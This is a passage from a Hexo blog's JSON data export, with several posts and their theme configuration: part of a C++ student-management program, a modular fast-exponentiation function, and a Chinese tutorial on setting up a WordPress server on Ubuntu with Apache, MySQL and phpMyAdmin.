class=\"string\">&quot;3.按成绩排序&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span> &lt;&lt; <span class=\"built_in\">endl</span>;;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;请选择排序规则!&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cin</span> &gt;&gt; x;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(x==<span class=\"number\">1</span>)sort(Boy, Boy + K, CMP1);</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(x==<span class=\"number\">2</span>)sort(Boy, Boy + K, CMP2);</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (x == <span class=\"number\">3</span>)sort(Boy, Boy + K, CMP3);</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;输入错误，排序失败&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span> &lt;&lt; <span class=\"built_in\">endl</span>;;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (x == <span class=\"number\">1</span> || x == <span class=\"number\">2</span> || x == <span class=\"number\">3</span>)<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;学生信息排序成功&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::MAX_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> Maxn = <span class=\"number\">0</span>, Flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i&lt;K; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (Boy[i].Score &gt;= Boy[Maxn].Score)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tMaxn = i;</span><br><span class=\"line\">\t\t\tFlag = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (Flag == <span class=\"number\">0</span>)<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;NO STUDENT&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;-----------------------------------------------&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;    学号\\t姓名\\t\\t性别\\t成绩&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;-----------------------------------------------&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>.setf(<span class=\"built_in\">std</span>::ios::left);</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; Boy[Maxn].Num &lt;&lt; <span class=\"string\">&#x27;\\t&#x27;</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; setw(<span class=\"number\">8</span>) &lt;&lt; Boy[Maxn].Name;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;\\t &quot;</span> &lt;&lt; Boy[Maxn].Sex &lt;&lt; <span class=\"string\">&#x27;\\t&#x27;</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; setiosflags(ios::fixed) &lt;&lt; setprecision(<span class=\"number\">2</span>) &lt;&lt; Boy[Maxn].Score &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;-----------------------------------------------&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tSTU S;</span><br><span class=\"line\">\tS.TITLE_STU();</span><br><span class=\"line\">\tS.READ_STU();</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> choice;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (<span class=\"built_in\">cin</span> &gt;&gt; choice)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (choice == <span class=\"number\">1</span>)S.ADD_STU();</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (choice == <span class=\"number\">2</span>)S.CHANGE_STU();</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (choice == <span class=\"number\">3</span>)S.DEL_STU();</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (choice == <span class=\"number\">4</span>)S.SHOW_STU();</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (choice == <span class=\"number\">5</span>)S.SORT_STU();</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (choice == <span class=\"number\">6</span>)S.MAX_STU();</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (choice == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tS.WRITE_STU();</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tsystem(<span class=\"string\">&quot;PAUSE&amp;CLS&quot;</span>);</span><br><span class=\"line\">\t\tS.TITLE_STU();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>"},{"title":"快速幂","date":"2019-03-29T09:11:09.000Z","abbrlink":"20c47d09","updated":"2020-05-11T09:49:07.786Z","_content":"# 原理\n未完待续\n# 题目\n未完待续\n<!--more-->\n# 代码\n```cpp\nll mod_pow(ll x,ll n,ll mod)\n{\n    if(n==0)return 1;\n    ll res=mod_pow(x*x%mod,n/2,mod);\n    if(n&1)res=res*x%mod;\n    return res;\n}\n```","source":"_posts/快速幂.md","raw":"---\ntitle: 快速幂\ndate: 2019-03-29 17:11:09\ncategories:\n  - Algorithm\ntags:\n  - 快速幂\nabbrlink: 20c47d09\nupdated:\n---\n# 原理\n未完待续\n# 题目\n未完待续\n<!--more-->\n# 代码\n```cpp\nll mod_pow(ll x,ll n,ll mod)\n{\n    if(n==0)return 1;\n    ll res=mod_pow(x*x%mod,n/2,mod);\n    if(n&1)res=res*x%mod;\n    return res;\n}\n```","slug":"快速幂","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkct003bqse54fnc1crv","content":"<h1 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h1><p>未完待续</p>\n<h1 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h1><p>未完待续<br><a id=\"more\"></a></p>\n<h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">ll <span class=\"title\">mod_pow</span><span class=\"params\">(ll x,ll n,ll mod)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(n==<span class=\"number\">0</span>)<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    ll res=mod_pow(x*x%mod,n/<span class=\"number\">2</span>,mod);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(n&amp;<span class=\"number\">1</span>)res=res*x%mod;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":139,"excerpt":"<h1 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h1><p>未完待续</p>\n<h1 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h1><p>未完待续<br>","more":"</p>\n<h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">ll <span class=\"title\">mod_pow</span><span class=\"params\">(ll x,ll n,ll mod)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(n==<span class=\"number\">0</span>)<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    ll res=mod_pow(x*x%mod,n/<span class=\"number\">2</span>,mod);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(n&amp;<span class=\"number\">1</span>)res=res*x%mod;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"搭建WordPress服务器","date":"2020-04-08T08:08:24.000Z","abbrlink":"34b16289","_content":"&emsp;&emsp;WordPress是一个开源的博客平台，可以很方便的进行博客写作，搭建WordPress首先需要你有一个属于自己的服务器，服务器空间则更加方便（因为不需要自己安装各种前置软件），当然还是推荐买一个阿里云或腾讯云的学生机服务器。\n<!--more-->\n**安装 Apache**\n```bash\nsudo apt update # 首先还是先更新下软件包源\nsudo apt install apache2\nsudo apt install # 当然再顺便安装下强大的vim编辑器\n```\n**安装 MySQL**\n```bash\nsudo apt install mysql-server mysql-client\n```\n**安装 PHP**\n```bash\nsudo apt install php7.0 \nsudo apt install php7.0-mysql\n```\n**重启服务**\n```bash\nsudo service apache2 restart \nsudo service mysql restart\n```\n**安装 phpmyadmin**\n非必须安装，不过安装下方便直接操作数据库，安装时记得选择apache。\n```bash\nsudo apt-get install phpmyadmin\nln -s /etc/phpmyadmin/apache.conf /etc/apache2/conf-available/phpmyadmin.conf\nsudo service apache2 restart\nsudo a2enconf phpmyadmin\n```\n启用Apache mod_rewrite模块。\n```bash\nsudo a2enmod rewrite\nsudo service apache2 restart\n```\n**初始化数据库**\n```bash\nsudo mysql -u root -p \nEnter Password: 密码（密码输入不可见)\nmysql>CREATE DATABASE wordpress;\nmysql>GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost';\nmysql>FLUSH PRIVILEGES;\nmysql>exit\nsudo service mysql restart\n```\n**配置WordPress**\n下载并解压后将wordpress目录下所有文件复制到/var/www/html\n```bash\nwget https://cn.wordpress.org/latest-zh_CN.tar.gz\ntar zxvf latest-zh_CN.tar.gz\ncp -r wordpress/* /var/www/html\n```\n接下来就可以访问服务器ip进行最后的配置了。\n另外，访问 http://ip/phpmyadmin 可以访问 phpmyadmin。","source":"_posts/搭建WordPress服务器.md","raw":"---\ntitle: 搭建WordPress服务器\ndate: 2020-04-08 16:08:24\ncategories:\n  - Web\n  - 博客\ntags:\n  - Linux\n  - WordPress\nabbrlink: 34b16289\n---\n&emsp;&emsp;WordPress是一个开源的博客平台，可以很方便的进行博客写作，搭建WordPress首先需要你有一个属于自己的服务器，服务器空间则更加方便（因为不需要自己安装各种前置软件），当然还是推荐买一个阿里云或腾讯云的学生机服务器。\n<!--more-->\n**安装 Apache**\n```bash\nsudo apt update # 首先还是先更新下软件包源\nsudo apt install apache2\nsudo apt install # 当然再顺便安装下强大的vim编辑器\n```\n**安装 MySQL**\n```bash\nsudo apt install mysql-server mysql-client\n```\n**安装 PHP**\n```bash\nsudo apt install php7.0 \nsudo apt install php7.0-mysql\n```\n**重启服务**\n```bash\nsudo service apache2 restart \nsudo service mysql restart\n```\n**安装 phpmyadmin**\n非必须安装，不过安装下方便直接操作数据库，安装时记得选择apache。\n```bash\nsudo apt-get install phpmyadmin\nln -s /etc/phpmyadmin/apache.conf /etc/apache2/conf-available/phpmyadmin.conf\nsudo service apache2 restart\nsudo a2enconf phpmyadmin\n```\n启用Apache mod_rewrite模块。\n```bash\nsudo a2enmod rewrite\nsudo service apache2 restart\n```\n**初始化数据库**\n```bash\nsudo mysql -u root -p \nEnter Password: 密码（密码输入不可见)\nmysql>CREATE DATABASE wordpress;\nmysql>GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost';\nmysql>FLUSH PRIVILEGES;\nmysql>exit\nsudo service mysql restart\n```\n**配置WordPress**\n下载并解压后将wordpress目录下所有文件复制到/var/www/html\n```bash\nwget https://cn.wordpress.org/latest-zh_CN.tar.gz\ntar zxvf latest-zh_CN.tar.gz\ncp -r wordpress/* /var/www/html\n```\n接下来就可以访问服务器ip进行最后的配置了。\n另外，访问 http://ip/phpmyadmin 可以访问 phpmyadmin。","slug":"搭建WordPress服务器","published":1,"updated":"2020-05-11T09:42:34.785Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkdd003fqse5g82599jt","content":"<p>&emsp;&emsp;WordPress是一个开源的博客平台，可以很方便的进行博客写作，搭建WordPress首先需要你有一个属于自己的服务器，服务器空间则更加方便（因为不需要自己安装各种前置软件），当然还是推荐买一个阿里云或腾讯云的学生机服务器。<br><a id=\"more\"></a><br><strong>安装 Apache</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt update <span class=\"comment\"># 首先还是先更新下软件包源</span></span><br><span class=\"line\">sudo apt install apache2</span><br><span class=\"line\">sudo apt install <span class=\"comment\"># 当然再顺便安装下强大的vim编辑器</span></span><br></pre></td></tr></table></figure><br><strong>安装 MySQL</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install mysql-server mysql-client</span><br></pre></td></tr></table></figure><br><strong>安装 PHP</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install php7.0 </span><br><span class=\"line\">sudo apt install php7.0-mysql</span><br></pre></td></tr></table></figure><br><strong>重启服务</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo service apache2 restart </span><br><span class=\"line\">sudo service mysql restart</span><br></pre></td></tr></table></figure><br><strong>安装 phpmyadmin</strong><br>非必须安装，不过安装下方便直接操作数据库，安装时记得选择apache。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install phpmyadmin</span><br><span class=\"line\">ln -s /etc/phpmyadmin/apache.conf /etc/apache2/conf-available/phpmyadmin.conf</span><br><span class=\"line\">sudo service apache2 restart</span><br><span class=\"line\">sudo a2enconf phpmyadmin</span><br></pre></td></tr></table></figure><br>启用Apache mod_rewrite模块。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo a2enmod rewrite</span><br><span class=\"line\">sudo service apache2 restart</span><br></pre></td></tr></table></figure><br><strong>初始化数据库</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo mysql -u root -p </span><br><span class=\"line\">Enter Password: 密码（密码输入不可见)</span><br><span class=\"line\">mysql&gt;CREATE DATABASE wordpress;</span><br><span class=\"line\">mysql&gt;GRANT ALL PRIVILEGES ON *.* TO <span class=\"string\">&#x27;root&#x27;</span>@<span class=\"string\">&#x27;localhost&#x27;</span>;</span><br><span class=\"line\">mysql&gt;FLUSH PRIVILEGES;</span><br><span class=\"line\">mysql&gt;<span class=\"built_in\">exit</span></span><br><span class=\"line\">sudo service mysql restart</span><br></pre></td></tr></table></figure><br><strong>配置WordPress</strong><br>下载并解压后将wordpress目录下所有文件复制到/var/www/html<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://cn.wordpress.org/latest-zh_CN.tar.gz</span><br><span class=\"line\">tar zxvf latest-zh_CN.tar.gz</span><br><span class=\"line\">cp -r wordpress/* /var/www/html</span><br></pre></td></tr></table></figure><br>接下来就可以访问服务器ip进行最后的配置了。<br>另外，访问 <a href=\"http://ip/phpmyadmin\">http://ip/phpmyadmin</a> 可以访问 phpmyadmin。</p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"d